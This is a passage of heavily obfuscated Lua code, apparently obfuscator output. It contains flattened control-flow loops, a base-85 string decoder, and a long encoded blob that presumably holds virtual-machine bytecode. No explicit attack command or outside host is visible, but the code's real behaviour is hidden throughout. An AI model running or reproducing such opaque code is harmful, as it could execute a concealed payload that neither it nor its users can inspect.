t[2])+t[0x5]);Y[25107]=i;end;else if not Y[86]then(Y)[15293]=(-402653062+((t[8]-t[0X9]&Y[0X3F34])<<Y[1372]<<Y[0X1286]));Y[0X49f8]=-0XbCC+(((t[9]~Y[17134])+t[0X7]~Y[16180])>>Y[0x482d]);i=(0X4ed8F746+(((t[0X4]==Y[25107]and t[0x5]or Y[15130])>Y[0X482D]and t[6]or Y[25107])-Y[2984]-t[7]));Y[0x56]=(i);else i=(Y[86]);end;end;else y=q.B;if not not Y[4228]then i=Y[4228];else i=(-0x2c+((i+Y[14191]+Y[17134]|Y[9593])-Y[0XBa8]));(Y)[4228]=i;end;end;elseif not(i>=0X1.8P2)then I=a;if not not Y[1271]then i=(Y[1271]);else Y[0x1deA]=(-8796093022155+((t[5]~Y[0X049F8]==Y[18936]and t[4]or Y[0X6050])<<Y[0X482D]<<Y[0X49F8]));Y[13377]=(-37+((t[6]+Y[14191]<=Y[86]and Y[32258]or Y[32258])<<Y[0x03B1A]==t[0x1]and Y[18936]or Y[24843]));i=3+(t[0X9]-Y[0x007ae7]+Y[4841]&Y[25107]==Y[0x4Fb1]and Y[0x007e02]or i);Y[0X4F7]=i;end;else break;end;end;i=43;repeat if i==0x1.Cp3 then for r=0X0,0XFf do(S)[r]=y(r);end;break;else if not Y[0xaC]then i=0XE+((Y[0X6213]&Y[0X4Fb1]~Y[15293])<<Y[13377]&Y[0X6103]);Y[172]=(i);else i=Y[0XaC];end;end;until false;local c;G=nil;local w,v,l,X,L;i=0X002A;while true do if not(i>42.0)then if i~=1.0 then c=(function(r)r=W(r,"\122",'!!\x21\33!');return W(r,"\x2E\z .\46.\z  .",p({},{__index=function(r,B)local q,F,U,e,s=o(B,0x1,0x5);local G=(s-33+(e-33)*85+(U-0X21)*0X1C39+(F-0X21)*614125+(q-0X21)*0X31c84b1);q=A('>\z  \073\z  4',G);(r)[B]=(q);return q;end}));end)(s("LPH$jkU%>T`BE>z!&-d!\"Cl+REf:?4?Z^4-FE2)5B8ct2AU&<U#]t!+FE2)5B:]D0z!!%rb?XI\\^GA1r*AU'1+'ac'++<VdL+<W6f>?_FA+<VdL+<VdL+<VdL+<VdL+<VdL+<VdL+>,o*-nd&$/hSb//hSb!+<VdL+>,9!/1`8(-mL#b5X6q/+<VdL+<VdL+<VdL+<VdL+<VdL+=J]^+<W3g-mL#a-71uC5X6YB-n$`%0/\"_%-mKr_,9nE]-nd&\"/1`Cr+<VdL/2&Y)-8#WJ+<VdL+<VdL+<VdL+<VdL+<W<e+>+s*5X7S\"5X7R\\/0H&f-mh2E5UIg)-71')5X7S\"5UI^(.P*2)/hSb//hSV\"5X7R_/g)8f,;'<G+<VdL+<VdL+<VdL+<VdL.PDns-9sg]5X7S\".Nfi^,qL/]+=\\cd-9sg]5X6YB-n6c#+<VdL+<VdL+<VdL+>,2p-mL#d.R66G.Nfi`/.*LB+<VdL+<VdL+<VdL+<Vm[+>5uF5X7S\".Ng2f-m1&f-8-u&0-_bi-9sg]-7C3+5X7S\"5X7S\"5X7RZ.P*2)/hSb-0.&qL5X7S\"5X6_?/gUiI+<VdL+<VdL+<VdL+<VmO+<s-:5X7Ra00gg+/gDYp0.8A(/2&J(0/\"e+/hAY(.R66a5X7S\"5X7S\"5UAZ\\5X7S\"5X7RZ/gEVH5X7S\"-8$De$6UH6+<VdL+<VdL+<Vd[+<W!r5X7S\"5X7R_,sW[t.OHJl-9sg]5U.p/5X7S\"0-qns/1!PH5X7S\"5UA'K5UIm1+<W3d/1rP-+<W-[5X7RZ+=[^@+<VdL+<VdL+<VdO+<W9`5X7S\"5X7S\"5X7Rc-n$B,5X7S\",;()]+<W3^5X6PZ5UIs'/g`hK5X7R]/1r/45X7Rf-9sgB-pU$_-7CMu-mgJf0.[GQ+<VdL+<VdL-nc\\c+=KK%-71#c5X7R]0.\\4s5U.[B5X7Rc+<VdL+<VdL,=\"LI/1*V/+>5uF5X7Rc,pO^$5X7S\"-m0WT+<W.!5X7S\"-7gGh/g)bR+<VdL+<VdL0-DA^0.\\>55X6Y@-nd4u5X7Rf+=09<5UJ`]5U\\6-+<VdX-9sgE/h/M(+<Vsq5Umm!+=09<5X7S\",p4<Q+<VdL-pU$E-n6i%/gVhs$6UH6+<VdL+<W<j00hcL/0H&`-9sg@/0H&X00h05/1Mu35X7RZ-9sgB,:+`d,sWe,+>5uF5X7S\"-8$Dc5X7RZ-9sg]-7's'5X7S\"5UJ$8-n7J8,75P9+<VdL+<VsV/g`h.+>,!+5X6P:00hcf5U@aB5X6YL/g)8Z/2&D\"0.JLq+>,;o5X7S\"5X7S\"5X6kM-7CK\",sX^?.OIDG5U[j*/hSb//1)Sk5VEHe+<VdL+<Vdl,q^Mk+>,!+5X6YG+<VdL0.&qL5X7S\"5X7S\"5X7S\"5X6Y]5U.p1,sX^\\5X7S\"5X7R]/0H&`5X7S\"5X7S\"5X7S\"0.]@R5X7RZ/g`%T+<VdL+<VdL-718i,p4fe.NfiV+>5uF5U\\6-+=np+5X7S\"-8-c#0/\"t'-m1/i5X7S\"5X7S\"5X7S\"5X7R_+<W3^5X7S\"5X7S\"-7g8f5X6YG00gp=$6UH6+<VdL+>+ri,=!Y\"00hcf5U[a)5X7S\"5X6tF+<VdL.O@>F5X7S\"5UJ*75UIU),:jri-9sg]5X7RZ+>+lg,pk8r,=\"LZ5Umm!+=]WA-8-hq.LI:@+<VdL+<VdZ-8-tr5X7S\"5X7Rc+<VdV-9sgB/hA>75UIm1+<VdL/1;f0,pklB5X7S\"5X7R_/h/Cp+>5uF5X7S\"5X7R]/0H&X+<VdQ5X7S\"/hRJR+<VdL+<Vdl.Ng>i5X7S\"5X7S\"-m0WT+<VdL/g)8Z-pU$_5X7S\"5U[`t+<VdL+>,,l,pklB5X7S\"5X7S\"5X6YE/0H&f0.n_>,p4<Q00hcK+>,;S+<VdL+<VdL+<Wp!+>,!+5X7S\"5UJ*++<VdL+<VdL+<VdL/h\\P:5X6eO-9sg]5X7S\"-7g8j.Olu%+<VdL/hAJ#-7CJm5X6P:,sWq&+=ocC,p4``$6UH6+<VdL+<VdL+=8W^00hcf5X7Ra+<VdL+<VdL+<VdL+<VdL+<VdL/gEVH5X7S\"5X6eO,sX^\\5X6_K5X7S\"5X6Y=/0u\\s+<VdL+<W9`5U@O(,75P9+<VdL+<VdL+<VdL0-D`05X7S\",9S*O+<VdL+<VdL+<VdL+<VdL+<VdL+<VdL+<VdL+<VdL+<VdL+<VdL+<VdL+<VdL+<VdL+<VdL,sWe0/0bKE+<VdL+<VdL+<VdL+=JW\\/g`hK5X6eA+<VdL+<VdL+<VdL+<VdL+<VdL+<VdL+<VdL+<VdL+<VdL+<VdL+<VdL+<VdL+<VdL+<VdL+<s,u/hA4S+<VdL+<VdL+<VdL+<VdZ-8$Dl-9sg]/0H&X+<VdL+<VdL+<VdL+<VdL+<VdL+<VdL+<VdL+<VdL+<VdL+<VdL+<VdL+<VdL+<VdL+<W't-8$ho$6UH6+<VdL+<VdL+<VdL+<VdO/g)bm5X6eA00hcU+<VdL+<VdL+<VdL+<VdL+<VdL+<VdL+<VdL+<VdL+<VdL+<VdL+<VdL+<VdL+<Vd[5UJ*7-jh(>+<VdL+<VdL+<VdL+<VdL+<W9i+<Vmo,q^;d5UJ$5,:jr[+<VdL+<VdL+<VdL+<VdL+<VdL+<VdL+<VdL+<VdL+<VdL+<VdL+<VdL00hcR/h[PS+<VdL+<VdL+<VdL+<VdL+<VdL+=\\c^+<s,t/g)bh-pU$_5X6VK/0H&X+<VdL+<VdL+<VdL+<VdL+<VdL+<VdL+<VdL+<VdL+<VdL+>5uF/1rCZ+<VdL+<VdL+<VdL+<VdL+<VdL+<VdL0/\"Fj,sWe.+=]WA5X7S\"5X6_?-pT(3/g)8Z+<VdL+<VdL+<VdL+<VdL+<VdL+<VdL+<VdL+<Vmo5V+$+$6UH6+<VdL+<VdL+<VdL+<VdL+<VdL+<VdO.Ng>j5X6PH+=KK?5X6YK.R66a5X7S\"5UA$*.PECs+<VdL+<VdL+<VdL+<VdL+=\\ur,q:Mo5X6kC0+&gE+<VdL+<VdL+<VdL+<VdL+<VdL+<VdL+<Wp!+>+s*5X6VH+=o/g/jMZe5X7S\"5X7Rc/gWbJ5X7R\\+>,!+5X6eA,=!S./g`h5/1Mbg5X6YK+=[^@+<VdL+<VdL+<VdL+<VdL+<VdL+<VdL+<VdL+<W<[+=\\^'5X7R\\/0H&X.OZW/5X7R]/g)B(5X7S\".Nfs$5X6V<-pU$I+=o,f+<W=&5X7Ra+=IR>+<VdL+<VdL+<VdL+<VdL+<VdL+<VdL+<VdL+<VdL5U.m(/gEVH5X7S\"-7CDt+<VdL+<VdL+<VdL+<VdL+<VdL+<W9f.OZSi5X7S\"5UJ*9-jh(>+<VdL+<VdL+<VdL+<VdL+<VdL+<VdL+<VdL+<VdL+<VdR-nZVb+>,;n5X7S\"5X7S\"5X7S\"5X7S\"5X7S\"5X7S\"5X7S\"5X7S\"5X6_M+=JWF+<VdL+<VdL+<VdL+<VdL+<VdL+<VdL+<VdL+<VdL+<VdL+<VdL+<W3[0.JRs+<VdL+<W9h/1`>'/1`>'/hSb/+<VdL+<VdL+<W3g,74c#+<VdL+<Ve4>qIW8$6UH6+<VdL+J&Q6z!!%r^Eaa0)ATWk8F(K0!@s\"<mz!!!\"X\"^bVIBm-*/I&*S=!!!\"X\"*.slSf[q4z!/q(g?X[JUN!*d7F^gpCz!!!\"j#QOi)zHN4$G!!!!)5`>edF^g:5D..NrBV#S3z!!%rdB4Z1%ATV@&@:F%aHN4$G!!!#g5E#eVDf0&nFGp5CN!Eg1DerunDN\"a+?Z9q-N!3QqD/WsVrr<$!zT!&+oz!1k&.z!!%rY0qS#qRJ?d]s8SZUz!!!\"X#'Fg&@:O)E+92BAzT`L_hz!!!\"Gz!!)LSN!+!+FD.8bSK*1\\!!!\"X!\\Q]r\"D2@cA;gmW-m`CS.9ehB$=/Sr?XI;]DI[*sHN4$Gz!1k._z!!&U20Xf4+!!!\"j<r`4#zScA`j!!*'\"!1s2qz!!%r\\?XIAaSk(K;V#UJq!/q,(H#R>5ArI\";Df0]7@V'SO#64`(zN!<m4Ec#6,Mub/^\"_D^pDfUd??XIks@\\*Z%z!!&Sjz!!!\"j'`\\46zT)Slmz!/q.i?YOCgAU'dXz!!!#AN!=<2GB7>;Mu]Fcz!!!\"jB^m\\8zN!=0BD.7'sSlAb/#ljr)s.07oz!!&T!!!E<%s8W+X\"^bVRF_mWo1B7CT!!!\"X#%(_I@;KbO\"TSN&zN!<p3@<?!mStT0bz!/q>-ATVd#FCB9\"@VfVI!!!$\"zN!=NG@ps1iN!=?FEbTE(N!*KpCikUD?XIY]FCB9\"@VfVI1&q:SzT#&&=s8W-!s.0o)z!!&Sj!!!$\"!!!\"X\"`Rs[Ci#],!<<-#!!!\"X\"E\\p.AW-h-DKBB0FGpBF@:F%aScSllz!/q%iH$!Vh-i!`BzN!*KpCh8P.Ci<`mScf#nz!8$Q<\"p\"DU!WsSJ56E&256E&258+843thi$#QkqH58+D83s.JF56Cuq6N]%F58+,$#QkM<56DDu49I#756h]0!=o877qA;!N<hWK!s;9u!!!!#!<W]0Mr=^>4TdnN$PNLB0`sWB'H]aG1a>Ek$n\"IG*<SM.D$*!9!s:(V5Slik&0\"%?%0Jg2EWZF`;?I%(+Tjq2!s:F`9`mTb#F5HU\"'#FfiW92e)$<;05N2_H$Q0<[5!B&P\"$Zki\"&<8,.jtLF\"$Zl8.f_(%\"!7VV\"$ZmA!<YOg4TdnND$*!)-S#0!N<',G!s:%_\"+^IT5K<up$-3NTz!<EB)mGJ$J&Hb6\"&Hb8+!kAa)\"pkA6\"&8q##>bL)%gE[L!seu>%oiT0!!!$*&chad!X#P-\"$Zmi\"9Ujj7gB2\"\"$^&nXTJYi56h8r\"!%J.6ONu%6N[E47gfD)!so&o3s,R,JH>p8-j)a;5<B5T#QlX\\56G<r56Cum-6#\\^\"9VL'59Bt0#Tj-N+!XM_\"9TU:!>dg\"!sgsj\"!7V^\"$Zm=!WtXhT`bH^577Q!56D!0\"*\"E-!uD&%)hnCr\"<W3r!sA^g!<YP2:'1V$)rUf6#CumX0*B;s\"$[ap!<XtWXT8MgaU$o.OU3`E!s^.TJH5j;.ld\\b\"2P*B577i$#R^_:*s:$o\"$Zki#:9Z\\!sf\"B!<YOs!s8f2%gN7?!s`0PPlh+A\"%<;V07j3,\"9\\H#\"$\\;j!WrQ-klClN1JS#T\"\"Ub[(I&90#Qonb\"$]!P\"!9`D567kg\"$\\dJ'a$Z&i;j$F\"#gGg!s:2^0.Ri#\"47/P5;NBD*s91X\"$\\RD!sf\"2!WtYG!s8f22[9Kg\"#!q5.i18LR0!IT.gH.^\",-gZ5;**@#VQ8^+#=!$#Qljf\"TniW>qZEb#Qs`$\"$\\RD!sg[b\"!9H(!sf\"\"!WtY?!s8f^!s9W$!s8f2SHAsY.gH.^\"5*_X56E\\H\"TniW>qZEb#QqI9\"$]\"3(HX\\\\!sf\"J!s:bP!s9X=\"9Uk:\"4[JU5<ArL*s9ai\"$]!X!sf\">!s:aiaTM]13tDE!577Q!\"760m5=5MT*s7K*\"$]!P\"!9l4!seur#6b234'b&Q#?*tt!sf\"j!s:ai[/g@o7fri!\"%NS\"\"$Zli5<BZC\",R-_5<h4G3s4.<\"$ZkmR/n*/:'1V,!s8f:!s9VU:'1V$W<<;f!s8cT\"/,_t56H$156Cui:&k7o!!Ec=&.AgEOl6?DT`G6[\"/,_t56D>s56Cui:<O0t%upo*',M<](C(a,\"\"==:',-N29*5n258+hL1mJ(D(FTAK\"$]No$OQtZ\"$[Ss!sA^k!<YP&L&qG[\"0DS+58R'2-PmS^\"%r`A\"$]Ns%giDY\"$]No$ORO\\Oon>^',)ht=T^l`)[cuTM#d]C',)04',OCZ(D@T>\"-ETd58P+T0`t,P58OD(8$)do(HDRd\"$Zm]!<YOg!tRaV!tQd^@08_1!s;$nz#lp7L!Wtjn56F=V5Ptnl#1s)'\"%<;V(De#i(BXb0,G\"o<\"9YV(\"$Zku*rlB\\\"$\\#.!sBPF\"\"XNd\"$Zkm*rlBl\"$\\+O)aFL^!<YOk!s8f:#6P56T`G6[';bj6\"9Vd/58OP<\"W%OK#Qq=4\"$[_4!seuP\"$bK@)]M$Y(E6<m$NgY:$Qf?nQ3%-k)Zp0n\"$H`N(De#i)[c`R\"#U0F(BXajq>qHL5QbR\"57^Kk\"9VL'58s\\,/-B_k56DQ<!$@L-!sA^k!<YOg!s;9u!!!!$!XK,8!:A\\G!t>>s!t>>s!t>>s!s8cq!s\\p#!uV2*!s8X#T)n'Xb6C-1!!!!\"#R1;&huWuq\"$Zl&\"$Zki\"&8q5\"$boXWXHNL,mOMS#Qld`57[hu#SRFF#SR:B*u>.a#Qm'h56D8q49HT+56D],\"To8;\"Tni3?N:'+!!42q&-/on!X%Zg\"$[k4!sf#)\"Tpsk'.X%b'/'>=!s9VI'/KUjaTDW0'.X.j#87V0\"/uA)56DQ@!!D$Z\"$[_@%m'jq\"&8q31B7NN\"Tpsk'-dJZbln26.oQNU\"+^OV56hi43ti\\<#R;\"R3s2#V\"$[S(!sf\\V%m(Ft!sf\"V\"9Ujn'+[/<56D/r'+[/,eHH%>'0?:%\"*F]1*sVlR(BXaj(D@HD\"2P-C56DQH!!<lb!!B2(\"$[G4!sf#!!WtY+>6>-52$6&J'+[/<2Zj<j'+[/,K`M9?#87V0'.3kf#87V0\"!Ib2)Zp0n\"-!<`56D94!!<lV!!AVn\"$Zku\"$?[B\"Tpt:-S$\\Lr<!-d!u!m!\"#g_o\"![mO!s9KJ*sVlR!s9>k(Jb,=!t-%J\"187658+\\P!<Wu[!!CmT\"$[m%!<WH,i<06I(KU\\E\"/Q,&58,7T<$r=m?md<8.Kf>G\"$Zl$-NF5X\"$Zl$2ZNpn3rfB]!<YP>'/)WRM$*oF\"%WYc\"0hq156hi43tiD4#R;\"R3s1TK\"$[GL.mYge!sf\"f!WtXh'/KUj1C\"'c,6J)O!ukMf#6P56!uENkjTP`N'/'Fn\"766o56Cln70DoX\"$[S8'0@\"+!seu:)ZTu6!WtXh'/omn1BUh`eH,h;(D@_g\".9;p56D0970B(]\"$[S8%m'lm!<YP&%g*(>jT>TL.h`Ro\"8)Zs59hC#0cL2s/-E!U\"$Zl4'*SI?)dOP[!<WH,!uENk]`\\F%'-dSb\"3CQG58O\\0#Qq=4\"$[G4-U@i/\"$Zl$*rlC3\"$[St!seu:)ZTun\"9Ujj'-dJZq#gda!uD&%\"+^XY56DQ@!!Bn9\"$Zki(G-G!!seu:)ZTsR*rlBV,6.hj!WtXh'.3b^'.X%b'/'=f4Tdn^$NgY:m/mGT',q#Z\"'#Ff)]'/L\"181456EP@>6Bie\"$Zl4%g<%;)dOP[!<WH,!uEO*;Zd:-eH5n<(Jb,=!t-%J\"\"aU>)Zp0n!sJck'12j-#87V0'1W-1\"(_R!(Jb,=\"5s7_56hi43tjCP#QqU<\"$[S(\"\"XPb!s:ai%iYK^!s:(j:BLk)$QB'J'-@2VaTM]1!tumZ\"0D\\.56L-O\"$]oF\"Pa#3z(Je1,/kKDY@qB:e7r)s[6Ua]j3cT4H$3:+a!WsGF56Do.5E#]8!f@Bk-OU\"^*s2Tr=T]`o\"%<;V!s8p-'*A=B!t,nF!s9Jt%hf$K)[?HN*sVlR\"$H`N!tumZ!t>>s*sVlR!uE0^\"&T.b!s^1R*s2Tr,7ak^%iYT]\"!%J.!s8X#z\":.%a=Tnehi;s*5\"$Zl>\"$Zki\"&?H4qZ6Ep63e_C;$1A3577Pq#Qp%e\"$[;D!sf8B%o`WC\"$Zkm\"$?Z'\"$[;(#<N;,!sfDB!sf!3\"$[/$\"$-N-\"$[;$!sf!o!<YOo!s;%($O8a$(BXpFV#^Z_!s]26\"'#Ff%grV($QB0R%j(lZ%grV($R5`Z\"%<;V%grV(\".]Gp57[u$#Qob]\"$[;(#<N$i!<YOo$NgY:9`mTj#6P56D$*!1%g*(J#6P562$6&C!!!!+6S:et8P;cR%Qt*uL#E(88HV0Z8HV0b%hAmU#87,T!u!'b.0DdB#9*[_!s;%4(BXpF5m'=b',LlU+TjqJ)Zp?J(EWVZ!ujo9)$<)B%gP/u0`sWB!t.Hu;$0#n!s8f2=T^kp%gs$QFTXiE$NgZO(CMJj#m3Bo!s;;]%>>/6##Gs<!sf2H$PNVN\"$Zbc!!!7$JH8\\)2I0!k!:A\\G!t>>s!t>>sNXtOZJdF+5\".oZ_\"$!%X70=D05GJ;_\"%NFq\"&8gr!!!$#$37?i!X\"D_\"$ZmI!<YOg_#XX&:*1E?+!64=!s8i359CPn!^4@#\"!8on%0Jg:p&Y=!!tu>9WW<bH5Qc9656D94!!?L/58+8(#QkGN!#nZ8\"9TqP59la#!sBPF\"\"YB1:.k\\C!<YP.M?3k_,=2J8!uDV=)[?HN\"/u;'5Ige2L&qY`YlOqk',(UM(C($J\"#U0F)]Jl=\"*\"E-#6P&6\"-ilh56h8m*t&/Q#R^_:*tM*K\"9Udh56D98!!>pt56K.2\"$ZmA!WtZ@!Z0Pk#m2%I5KNp.+#sG^!<YP.!s;'h!>C1h#m8i]\"$Zki\"&=RP*udHe!s;&J!Zr@H+!64=!s@ok\"$Zn0!<YOsL&qG[\"18.358R&s\"9\\/p\"$c#X^C&a)16)DX(CC88!WtY/,9L;8!s;%(,9p.iN<02H+!6XJ9-55p?m?<h!s=ei\"$Zmq!<YOd!!!!#%Lb5qalNR+nI,La\"7Zd%5DK8p!Wr^`!W)nQ!=&`\"\"p7'l-]8!*\"!%J.\"+Q@4!!A,[\"'YjV\"$_hI])`!>Ylg$fMZFIn]a+^)!s>\"n%0K$$56G8^!<<3Z\"$Zmq\"TpuO%g.^j3<Os?\"$_\\EHNONU=T^mH!W)nU!=&]u\"$^8tbn3DIN<]PM!s>S)/H^KT!<<3(K)lF6!W)m\"#Qrl`\"$Zm3WrW2&T)l+r!!AtsZN1%.N<',G!s>S)/H`Na\"$ZmW!M9Am\",?oP!<<4o!<ZO.V#^Z_\".K=d!<<4_!N,qu\"2t9C56IeaZN1%.o`5.Z\"*^dH!!AtsY5nV*YlOqk\"/>l!>6C>qVZ?c\"QN=,f!!D<`\"$Zm[!ODe,\").j%Tah0W!@S&,!WtXhVZ?m(\"+:89\"%8UZ70AeU\"$ZkiWrXdSr;d!b\"*^dH!!B,\"Y5nV*eH#b:\"2tWM5B?qo#Y\"pX\"p7)V!K-uZ!D!;3Y5nV*T`P<\\\".'%p!<<5@!WtZj!NQ5k3s3_/\"$`geWr\\7^<3H>7!Wr_/!NQ7)!@n8Q!LEfe\",RNj56J(i\"'Yl,!WtZf!LEhB!FQ#7!WtXh?^h&r\"5s:`56L9R\"$ZkiRfNs#h#[[C\"02I/!<<52!<XOL!<\\#`,m+OY!<<5d!Wt[M%+Ge05Fr4>\"1f\"/p^NPur<?C,'a$Z&Itn%)\"3CWI5E>j6!<WT<MZF1h!u$k!!1*`X!<WT<P5u$pm1'5N!@S';!s:ai5D&t:\"-!Bb56E$X70Cp>\"$ZkiK)mP+\\H;puMZLEj!sf\"F!s:aiItIb%!s=/V%0I8r!<@lUlN%(n%talj\"ToEr!<<4e!s:aim0a\"\\[fNr=Nr`4l!P8C8#e'iD!P8@_\",R-_5IUZ[!J^\\`\"7ZHq56J@qQN7'g]ak30!s8cT\"18765E>i'!Wr^h!W)nY!=&_O\"9UlD!M]\\u#Qr$K\"$_\\EqZ2TU#6WKZ\"$_D=HNONUV$$lbr<`Xb!@S'3\"9UlH!H/&G\"0D\\.5DoQ#!KR7U\"2+g>5E>i3!Wr^h!W)nY!=+M`MZJk><!/Nk\"$Zm=%g,#u@08_uGB6^cG?Y%Lkl_)QNrb\";!sjqgqZ2`Y#6TY`\"$_hIMZJ_:(^#a$\"$_PALB3;6<9XpK!J:Cd\"/-2,5DoQ#!KR7U8HXkO-j-^X\"$_hIVZ?l*Nrf+YNr]IfR0<[W\"&T.bm/[<Q!@S'#!Wt[?#m6(d3<Spa\"$^k1!<WT0i<9<JCM/5#<s,E+\"$Zm#\"$C@o!<WT0bln26\"$Ccr\"!i4^\"/,o$56E<D70D'D\"$^S!!<WT0R0EaX]a+^i-j.!a\"$^^>B0-3T\"p7'l*,@u]Ml$[\\:BSQ>\"$^_)!<WT0Ka%WDItutf!t5;1\"Tpu)DZ^7IYm(:pCM3&9*Wu'=\"$Zmu%Keot]b1E3P6%Q_!seu2P5u*p]`nR'\".K>#!<<5.!P8@4!s?\"59EThK\"$^2rF!q.\\\"p7'l!s^/k6ZW81h$*sG\"763n5KsH9LB0C;nHo@_MZN\\UMZF%bOUhOYMZJS7!sf#-\"p7'l!s^/_7fs#!R0NgY>@[%(,6Nc9\"$Zma\"TpuI!M]Yt#Qq16\"$_\\EqZ2TU#6UY)\"$_\\EqZ2TU#EJnT!Wr]1h$4$HMZK.G!sf\":#6R2C!IFnS\"-!Qg5E>i'!K-sqNra/$#QpV'\"$_\\ENrb.><i,qV!K-t`Nrc9^!sjqgqZ2`Y#6XK$\"$_\\EMZJk><0%'4!Wr^h!W)nY!=&_S#6R2G!J^]6!E=sX:'1V$K)t'A(P`$T!Wr]1_$:',!s8cT\"3CcM5E>jB!KR6dMZJ_:Nr`2^JHu?BP6%9W!sf\"6#Qm9n\"-W`p\"1\\[>56L!T\"$ZlpK)krS\"+pU`\"0hq156HN=PnFn=!f$f3!=k\"g:'1V$aTqu5\"8N'%5DoPp!Wr]1jTkrQMZN\\UMZF%bfa%[EDgQt)\"-!Th5C\\:dIpdm0K)l&[It*(O.g(J3\"$Zm;DZBm!!WtZ>!Ik1W\"8)p%5IUZg!<WV:!LEhr!@tb_>6>-5XU,(oY5rRJ!<E:f#m3E>$G->J!@.cl\"p7)J!KR8>!?8EZ\",d1.\"6g*o5E>jB!KR6d\"3CiO5DoQ#!KR79Nrak7!sjqgqZ2`Y#6V@?\"$_A=qZ2`Y)34fV!K-sqNrc-Z!sf\"F#m3Boh$X<LMZKjZ!sf#%#m3DM!W)nU!=&_?\"Tpsk\"4%!\"\"0i185L0AB!<WVR!QtMa!BUBJcN+\"J`rXWi!!AVr\"$Zm[!S7>P\"8rN.5K<fB!QP3A\"2,$D5K<eO!sf\"&$3NKpN=,hQb5l8%!<E;E$3NN9!H/&Gb5oK]b5hVG[0d\"#Y5urM`rS7(KaIoH[fLCL#e'i@!Oi(1\"6Bjl56Je(\"!Y>X\"-![7!t2^A!!B\\2^B\"<:h$O6KLB2`(#_rHX!J^[\\\"3h)R5G\\McMZGg?V$@)eY5na-&k2t[$j/`+!<];.7K\\2M\"$_hIMZJ_:1]tE!\"$_D=K)l'8LB7DU!sjecUB(H&MZN\\UMZF'D!IFnS\"18L=5E>jB!KR6d\"-j5r5J74&MZG4.bmOV<K)tiM!sf\"\"$NiTqm0NkZMZN\\UMZF%bfa@mH\"18aD5DoQ;!<WT0d0g%@K)qqW\"\"sb=\"9Ujj?^h&r\"8*$(56D\"W!=]/0$NiTqm1'4_!s8cT\"+^RW56Cum-DLSDo`@SbSIu#h\"'Ao!\"18R?5=\\?K#Y.8M!`qlV!sf\"R%0Jgb3s,a]56D/nfaS$J:BsYr;ca&,;[65%\"&)cb\"4[e^5<B*3!<\\/f\"$^!o!sf!o$j/^M.g$&5#;ZA_m0s.^4#6sE\"3h5V56h8m#Qp1u\"$]FS!shO)9*%ge!sf\">$j/^Y2Zj<f`=2o6$O6b>%grIF'+Y0N\"-j>u58shH!<XDG4<kdI#Qs`/\"$^8t@3l!`@fU-T!sf!E\"!RiP%0Jfs6N]FQXUG:r7ml8:*Wnn749PBf\"$]FK6T[e*!shOi!shOi6TYC@$j/^Q0*;I^kmRYY,6oFo-Q`Er.jG-%.gIR*0.-i-\"-!cm5;*O#!<_-d\"$[P7(E\"/.!sf\"&%0Jfs?\\8@Z\"0E%856L-\\\"$ZkiK)lD`W=B\"p!s8X#\"*9(q!!@_+!<<4S!<ZO.d1-7C]a0AoK)m5\"fa\\*KLB4jb!sf\"N%KeotM$!iE\"-jK$5Ec,/!Wr]1\"-W`p\"5OFh5ICXsMZG4.4Tdp,!J:FU#`A`\\!K-s`\"5*t_5Crt6!K-sr\"8rQ/5FV\\=!Wt(Xq%<coV?-PpNr^,Z!K-u:!>P^=%g,%W!W)nY!=+M`Nrb.>8;@5$!K-tX\"18XA5E>iC!<WT0SIYfeMZHQT\"9X8W]b2-V!Mp))0*C_V\"$_PAMZJS68;dLq!sf\"*&-G/i\"p9V]-j-jg\"$_PALB3;6+Tp+&\"$_\\EWrW;.\",.9g5D&u`!sjY_MZNtdLB78QLB.X<!IFnSMZN\\UMZF'<!K-u6!D!=O%g,%S!W)nU!=&^d&-G.P!K-u6!D&+LMZNtdMZN\\UMZF'@!J^]2!>ULnLB7P`\"0E+:5DoR>!K-s`\"5+1e5DoR>!K-s`\"2tcQ56D2o5D&t=\"!7X,&-G.`!L!P>!FQ\"h&Hb6\"!s^0*!FGp7\"1\\sF5DoQG!Wr]1q%*WmRfQ^q#QoVi\"$_PAWr`A/\"4[qb5FV\\c!Wr^p!LEhV!@n9.&-G.X!ODh0#Qp>(\"$`CY^B+KCUB+*l\"9Y+oM%:Dh!LEhJ!E90g&-G.\\!Oi+4#QqmS\"$_PALB.K:\"5sgo56D^O!!?kd!<<4O\"'^BYHNONU_%?c6\"!`-m\"/QS35DK8d!sf\"\"&Hb7=\"-!@.Dg)9h\"4[tc56D:7!!@EI49N,+\"$Zm7'*SJ^\"'>YP\"!Rih&Hb6\"!s^0J!P8@7#bqEYV?R-+\"+_'e56D:g!<<4Y&d(?#+/],>\"02G),,5/@N=7+c!T=Lj0*@IF\"$Zki#:9P*!M]Yq\"/un85GJ5]\"%TZuWr\\Xj<s+-a\"$cSa\",d1?\"5O4b5D'!Q\"p6L\\aUeP=UB,]D#Qs<(\"$ZlaRfPq[T)f$V\"5+:h5GJ77!<WT0/>iM;VZEOnT)h\"U`=`8;Dl3U<3i`9V!sA`!&d(?#UB/%=(BXaE-3ML*\"$Zki@grP-\"Tpsk?Xj'<JJ/,Mz<3QB?ScM.YWW@bR%O=H.!G4q.7[*pWL&m)2NWHKfDD&R&,'pBm-BJ7WU]GKMGZ:%2[K..YA2Xu?M?+\\t=C@X\"J,qdD!O;`\"I(02dG.n!m!Q\"k4aoS.9818;m!J1?H!BS4$1ro\\+RK9Jj>c7ZQ/2D0@$35b<!Wrl656DDu49I/;56Cum:]gk'58OP,#TNI<!sA].+#3p#(L7tT!sA]>BbpjR'/BY#\"'?3=!seuD\"$ad9g'Y%f=VD;J#QmX#56D!$%0KH056Cui:'1S'-3HO956G<r59gO<#U9ER7h]kE0*>2V59CC\\!GNb`,Qh<S56(Z`!!GG'=Y:0aS`'VP.0Dd:.0Deh!mL`R+9P=?56i!f!u?UmN<'h<\"0hk/5J[]>#Nu=-L'#U##9X*T\"$Zki$UYG\"!sB9l!WrQ-+Tjr`!n@;V+9N2X578En!u>#Y(D?mN\"$[#,OolI%5m'=R]`A4\"*sWT:+!6XJ!s<*:5:6gX0`u7p5:7hA!s8XJ\"$_qN0+U;M0+S$bJH5j;\"\"+HV\"!7aJ\"!Ib2)[@06)]OqB!s=ql\"$_qN,7d$A,7abV)[??F3<MJJ$O6Y63<MJZ)\\5mM)\\W2RN<',G'-@`a\"!80V\"3CQG56G$j577]V&-Jm4\"$Zl$(B>6R\"%NFq\"&8gr!!!!2!/]\\:\"5O(^56K^E\"$aa*!tRBojT>TL\"\"+`c!s9cR-S#9)!s^=V\"*\"E-\"!81E\"'G^j0-:9%\"#U0F(G@F@\",R$\\5:[fX#V-iE0`r^(56D-8!%/ij#T\"j9<!,8c59hBT#QnK;5:7f\\#QncC56D-@